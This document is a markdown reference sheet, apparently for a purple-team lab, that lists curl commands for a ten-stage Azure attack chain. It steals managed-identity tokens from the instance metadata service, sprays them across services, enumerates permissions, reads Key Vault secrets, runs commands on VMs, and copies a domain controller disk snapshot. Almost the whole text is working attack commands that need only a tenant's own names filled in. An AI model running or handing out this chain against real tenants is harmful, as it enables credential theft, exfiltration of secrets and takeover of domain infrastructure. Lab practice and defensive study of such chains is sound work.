# ARM Token Exploitation — Attack Chain Commands

These are **reference `curl` commands** for a staged chain that starts on an Azure VM with access to the **Instance Metadata Service (IMDS)**: steal a managed-identity **ARM** token, **spray** tokens for other resource audiences, then use **Bearer** tokens against Azure Resource Manager, Key Vault, Log Analytics, Cognitive Services, Microsoft Graph, and VM control-plane APIs. Run from a shell where `curl` and `jq` are available; set `TOKEN`, `SUB`, `RG`, `OID`, and audience tokens from saved JSON as you go. Replace placeholders (`WORKSPACE_ID`, `SECRET_NAME`, hostnames, VM names) for your lab.

---

## Stage 1: Token Theft

**Get an access token for Azure Resource Manager from IMDS** (requires `Metadata: true` header).

```
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**Parse a saved JSON response and export `TOKEN` into the shell** (adjust filename to match what you saved).

```
TOKEN=$(cat arm_token.json | jq -r .access_token)
```

---

## Stage 2: Token Spray

**Request IMDS tokens for additional Azure APIs** (save each response if you need it later; same header and API version as ARM).

```
# Key Vault
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
# Microsoft Graph
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"
# Storage
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"
# Cognitive Services (e.g. Azure OpenAI)
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://cognitiveservices.azure.com/"
# Log Analytics query API
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://api.loganalytics.io"
# SQL / database
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://database.windows.net/"
# Service Bus
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://servicebus.azure.net/"
# Container Registry
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://containerregistry.azure.net"
# Azure DevOps (VS Team Services)
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://app.vssps.visualstudio.com/"
# Purview
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://purview.azure.net/"
# IoT Hub
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://iothubs.azure.net"
# Exchange Online / Outlook (Office 365)
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://outlook.office365.com/"
```

**Load tokens from saved JSON files into variables** (filenames must match what you saved from the spray step).

```
VAULT=$(cat vault_token.json | jq -r .access_token)
GRAPH=$(cat graph_token.json | jq -r .access_token)
LA=$(cat la_token.json | jq -r .access_token)
COG=$(cat cog_token.json | jq -r .access_token)
```

---

## Stage 3: Reconnaissance

**List subscriptions** the identity can access with the ARM token.

```
curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2022-01-01"
```

**List resource groups** in subscription `$SUB`.

```
curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions/$SUB/resourceGroups?api-version=2021-04-01"
```

**List all resources** in the subscription (inventory).

```
curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01"
```

---

## Stage 4: RBAC Discovery

**List role assignments** where the principal is your managed identity (`$OID` = object ID from token claims).

```
curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'$OID'"
```

**Resolve a specific role definition** by ID (example: built-in role GUID — swap for definitions returned in assignments).

```
curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/acdd72a7-3385-48ef-bd42-f606fba81ae7?api-version=2022-04-01"
```

---

## Stage 5: Key Vault

**List secret metadata** (names/versions) in the vault (replace vault hostname for your lab).

```
curl -H "Authorization: Bearer $VAULT" "https://purplelab7.vault.azure.net/secrets?api-version=7.4"
```

**Read a specific secret** (replace `SECRET_NAME`).

```
curl -H "Authorization: Bearer $VAULT" "https://purplelab7.vault.azure.net/secrets/SECRET_NAME?api-version=7.4"
```

**List keys** in the vault.

```
curl -H "Authorization: Bearer $VAULT" "https://purplelab7.vault.azure.net/keys?api-version=7.4"
```

**List certificates** in the vault.

```
curl -H "Authorization: Bearer $VAULT" "https://purplelab7.vault.azure.net/certificates?api-version=7.4"
```

---

## Stage 6: RunCommand

**Get VM instance view** (power state, statuses) for VM `Attacker`.

```
curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/Attacker/instanceView?api-version=2024-03-01"
```

**Run a PowerShell script on the VM** via Run Command (guest execution).

```
curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/Attacker/runCommand?api-version=2024-03-01" -d '{"commandId":"RunPowerShellScript","script":["whoami","ipconfig /all","net user"]}'
```

**Start a stopped VM** (`PRPLAB-DC1`).

```
curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/PRPLAB-DC1/start?api-version=2024-03-01"
```

---

## Stage 7: DC Disk Snapshot

**Read snapshot metadata** (`stolen_dc_disk`).

```
curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/snapshots/stolen_dc_disk?api-version=2024-03-02"
```

**Create a managed disk** from the snapshot (copy for offline analysis).

```
curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/disks/offline-dc?api-version=2024-03-02" -d '{"location":"westus","properties":{"creationData":{"createOption":"Copy","sourceResourceId":"/subscriptions/'$SUB'/resourceGroups/'$RG'/providers/Microsoft.Compute/snapshots/stolen_dc_disk"}}}'
```

---

## Stage 8: Query Sentinel

**Run a KQL query** against a Log Analytics workspace — example: summarize `SecurityAlert` (replace `WORKSPACE_ID`).

```
curl -X POST -H "Authorization: Bearer $LA" -H "Content-Type: application/json" "https://api.loganalytics.io/v1/workspaces/WORKSPACE_ID/query" -d '{"query":"SecurityAlert | summarize count() by AlertName | sort by count_ desc"}'
```

**Query sign-in activity** (example: last 24h by app).

```
curl -X POST -H "Authorization: Bearer $LA" -H "Content-Type: application/json" "https://api.loganalytics.io/v1/workspaces/WORKSPACE_ID/query" -d '{"query":"SigninLogs | where TimeGenerated > ago(24h) | summarize count() by AppDisplayName | sort by count_ desc | take 20"}'
```

---

## Stage 9: Call GPT-4.1

**Call Azure OpenAI chat completions** with the Cognitive Services token (replace endpoint, deployment, API version as needed).

```
curl -X POST -H "Authorization: Bearer $COG" -H "Content-Type: application/json" "https://generalfoundry21.openai.azure.com/openai/deployments/gpt-4.1/chat/completions?api-version=2024-10-21" -d '{"messages":[{"role":"user","content":"Summarize the Azure security model"}],"max_tokens":500}'
```

---

## Stage 10: Graph Test

**Probe directory read access** — fetch one user (tests `User.Read.All` or similar).

```
curl -H "Authorization: Bearer $GRAPH" "https://graph.microsoft.com/v1.0/users?\$top=1"
```

**Look up the service principal** for the managed identity by `$OID`.

```
curl -H "Authorization: Bearer $GRAPH" "https://graph.microsoft.com/v1.0/servicePrincipals/$OID"
```

**List app role assignments** granted to that service principal.

```
curl -H "Authorization: Bearer $GRAPH" "https://graph.microsoft.com/v1.0/servicePrincipals/$OID/appRoleAssignments"
```

---

## Cleanup

**Delete the disk** created from the snapshot (`offline-dc`).

```
curl -X DELETE -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/disks/offline-dc?api-version=2024-03-02"
```
